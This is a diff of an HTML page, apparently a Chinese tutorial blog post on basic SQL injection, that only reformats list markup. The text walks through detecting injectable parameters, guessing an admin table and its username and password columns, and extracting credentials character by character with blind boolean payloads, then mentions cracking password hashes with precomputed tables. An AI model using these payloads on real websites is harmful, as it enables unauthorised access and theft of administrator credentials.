@@ -525,16 +525,32 @@
 </ol>
 <p><strong>初级的注入</strong></p>
 <ul>
-<li>判断是否存在注入<br>对于可能存在SQL注入的动态网页，只要该网页带有参数且此网页访问了数据库，则有可能存在注入<br><code>http://xxx.xxx.xxx/abcd.php?id=XX</code><br>给参数赋值单引号，查看页面变化（单引号不匹配而报错，则表示执行了SQL）<br><code>http://xxx.xxx.xxx/abcd.php?id=XX’</code><br>若未报错，可能做了单引号过滤，使用判断语句进行注入测试（SQL注入漏洞分为数字型和字符型）</li>
-<li>数字型漏洞<br><code>http://xxx.xxx.xxx/abcd.php?id=XX</code><br>若XX为数字类型，例如页码、ID等，存在注入时则为数字类型的注入。<br>给参数赋值为and 1=1，页面正常。<br><code>http://xxx.xxx.xxx/abcd.php?id=XX and 1=1</code><br>接着给参数赋值为and 1=2，页面报错。<br><code>http://xxx.xxx.xxx/abcd.php?id=XX and 1=2</code></li>
-<li>字符型漏洞<br><code>http://xxx.xxx.xxx/abcd.php?id=XX</code><br>若XX为字符串，注入测试需使用单引号来闭合。<br>给参数赋值为and 1=1，页面正常。<br><code>http://xxx.xxx.xxx/abcd.php?id=XX ‘and ’1‘=’1</code><br>接着给参数赋值为and 1=2，页面报错。<br><code>http://xxx.xxx.xxx/abcd.php?id=XX ‘and ’1‘=’2</code></li>
-<li>猜管理员账号表<br>在末尾加上：<code>and exists (select * from admin)</code><br>我们的意思是猜测他有个admin表段。页面返回正常，我们猜对了。当然也可能错误返回，这时就要看猜测的本事了。</li>
-<li>猜测管理员表表中的字段<br>我们再来猜他的管理员表中是否有一个ID段，在末尾加上：<code>and exists (select id from admin)</code><br>页面返回正常,说明他的admin表中有个id的字段。<br>我们继续： <code>and exists (select username from admin)</code>。这里的意思是看看他的admin表中是否有username字段，页面返回正常,说明在admin中有一个username字段<br>我们继续猜他放密码的字段： <code>and exists (select password from admin)</code>。返回正常的页面,说明他的admin表中有个password字段。<br>到此可以知道admin表中至少有如下三个字段：id,username,password，这种命名方式与普通程序员的命名方法一致。</li>
-<li>猜测用户名和密码的长度<br>首先猜他的管理员的id值： <code>and exists (select id from admin where id=1)</code>，意思是看看他的admin表中是否有一个id=1的值。<br>返回了正常的页面,说明我们猜对了。<br>接着猜ID为1的用户名长度： <code>and exists (select id from admin where len(username)&lt;6 and id=1)</code><br>这里我们猜他的管理员长度小于6,返回了正常的页面,还好,名字不是太长,我们一个个来实验好了。<br><code>and exists (select id from admin where len(username)=5 and id=1)</code>，返回了正常的页面,说明用户名的长度我们已经猜出了为5。<br>用同样的方法，我们猜出了密码的长度是10，要添加的语句是：<code> and exists (select id from admin where len(password)=10 and id=1)</code><br>到此，用户名和密码的长度都已经猜出来了，下面要做的是猜出它们的每一位分别是多少。<br>方法是在后面加上： <code>and 1=(select id from (select * from admin where id=1) where asc(mid(username,1,1))&lt;100)</code><br>我们这里做的意思是，猜测他的用户名的第一个字的ascii码值小于100。<blockquote>
+<li>判断是否存在注入</li>
+</ul>
+<p>对于可能存在SQL注入的动态网页，只要该网页带有参数且此网页访问了数据库，则有可能存在注入<br><code>http://xxx.xxx.xxx/abcd.php?id=XX</code><br>给参数赋值单引号，查看页面变化（单引号不匹配而报错，则表示执行了SQL）<br><code>http://xxx.xxx.xxx/abcd.php?id=XX’</code><br>若未报错，可能做了单引号过滤，使用判断语句进行注入测试（SQL注入漏洞分为数字型和字符型）</p>
+<ul>
+<li>数字型漏洞</li>
+</ul>
+<p><code>http://xxx.xxx.xxx/abcd.php?id=XX</code><br>若XX为数字类型，例如页码、ID等，存在注入时则为数字类型的注入。<br>给参数赋值为and 1=1，页面正常。<br><code>http://xxx.xxx.xxx/abcd.php?id=XX and 1=1</code><br>接着给参数赋值为and 1=2，页面报错。<br><code>http://xxx.xxx.xxx/abcd.php?id=XX and 1=2</code></p>
+<ul>
+<li>字符型漏洞</li>
+</ul>
+<p><code>http://xxx.xxx.xxx/abcd.php?id=XX</code><br>若XX为字符串，注入测试需使用单引号来闭合。<br>给参数赋值为and 1=1，页面正常。<br><code>http://xxx.xxx.xxx/abcd.php?id=XX ‘and ’1‘=’1</code><br>接着给参数赋值为and 1=2，页面报错。<br><code>http://xxx.xxx.xxx/abcd.php?id=XX ‘and ’1‘=’2</code></p>
+<ul>
+<li>猜管理员账号表</li>
+</ul>
+<p>在末尾加上：<code>and exists (select * from admin)</code><br>我们的意思是猜测他有个admin表段。页面返回正常，我们猜对了。当然也可能错误返回，这时就要看猜测的本事了。</p>
+<ul>
+<li>猜测管理员表表中的字段</li>
+</ul>
+<p>我们再来猜他的管理员表中是否有一个ID段，在末尾加上：<code>and exists (select id from admin)</code><br>页面返回正常,说明他的admin表中有个id的字段。<br>我们继续： <code>and exists (select username from admin)</code>。这里的意思是看看他的admin表中是否有username字段，页面返回正常,说明在admin中有一个username字段<br>我们继续猜他放密码的字段： <code>and exists (select password from admin)</code>。返回正常的页面,说明他的admin表中有个password字段。<br>到此可以知道admin表中至少有如下三个字段：id,username,password，这种命名方式与普通程序员的命名方法一致。</p>
+<ul>
+<li>猜测用户名和密码的长度</li>
+</ul>
+<p>首先猜他的管理员的id值： <code>and exists (select id from admin where id=1)</code>，意思是看看他的admin表中是否有一个id=1的值。<br>返回了正常的页面,说明我们猜对了。<br>接着猜ID为1的用户名长度： <code>and exists (select id from admin where len(username)&lt;6 and id=1)</code><br>这里我们猜他的管理员长度小于6,返回了正常的页面,还好,名字不是太长,我们一个个来实验好了。<br><code>and exists (select id from admin where len(username)=5 and id=1)</code>，返回了正常的页面,说明用户名的长度我们已经猜出了为5。<br>用同样的方法，我们猜出了密码的长度是10，要添加的语句是：<code> and exists (select id from admin where len(password)=10 and id=1)</code><br>到此，用户名和密码的长度都已经猜出来了，下面要做的是猜出它们的每一位分别是多少。<br>方法是在后面加上： <code>and 1=(select id from (select * from admin where id=1) where asc(mid(username,1,1))&lt;100)</code><br>我们这里做的意思是，猜测他的用户名的第一个字的ascii码值小于100。</p>
+<blockquote>
 <p>其中，asc函数的功能是将字符转换成ASCII码，mid函数的功能是截取username字段值的字串，从第1位开始，截取的长度是1</p>
 </blockquote>
-</li>
-</ul>
 <p>返回了正常页面，说明的确如我们所料，接着： <code>and 1=(select id from (select * from admin where id=1) where asc(mid(username,1,1))&lt;50)</code><br>返回错误信息，说明：50&lt;=第一个字的ascii码值&lt;100。接下来，我们用折半查找的思想： <code>and 1=(select id from (select * from admin where id=1) where asc(mid(username,1,1))&lt;75)</code><br>接下来我们猜测第二位： <code>and 1=(select id from (select * from admin where id=1) where asc(mid(username,2,1))&lt;100)</code><br>用折半查找的思想，采取上述方式，很快就能找到密码。</p>
 <blockquote>
 <p>注意：网站上密码多是以杂凑值处理，需要专用的哈希函数破解。尽管哈希函数是单向的，然而用户的密码是有限长度的，可以预先存储计算匹配，而非反向破解。</p>
